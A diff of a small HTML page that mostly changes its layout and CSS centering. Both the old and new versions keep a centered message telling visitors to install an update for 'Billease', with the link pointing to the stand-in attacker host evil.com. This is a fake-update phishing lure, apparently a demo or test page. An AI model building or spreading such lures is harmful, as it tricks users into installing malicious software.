@@ -1,24 +1,31 @@
-<style>
-  html, body {
-  height: 100%;
-  margin: 0;
-}
+<html>
+    <head>
+        <style>
+            html, body {
+                height: 100%;
+                margin: 0;
+            }
 
-.container {
-  display: grid;
-  place-items: center; /* centers horizontally & vertically */
-  min-height: 100vh;
-  min-width: 100vw;
-}
+            .container {
+                display: grid;
+                place-items: center; /* centers horizontally & vertically */
+                min-height: 100vh;
+                min-width: 100vw;
+            }
 
-.centered-div {
-  min-width: 100vw;
-  min-height: 100vh;
-}
-</style>
-
-<div class="container">
-  <div class="centered-div">
-    Please install this to update Billease: <a href="https://evil.com">Update Link</a>
-  </div>
-</div>
+            .centered-div {
+                /* Remove width and height constraints */
+                /* min-width: 100vw; */
+                /* min-height: 100vh; */
+                text-align: center; /* optional: center text horizontally */
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="centered-div">
+                Please install this to update Billease: <a href="https://evil.com">Update Link</a>
+            </div>
+        </div>
+    </body>
+</html>
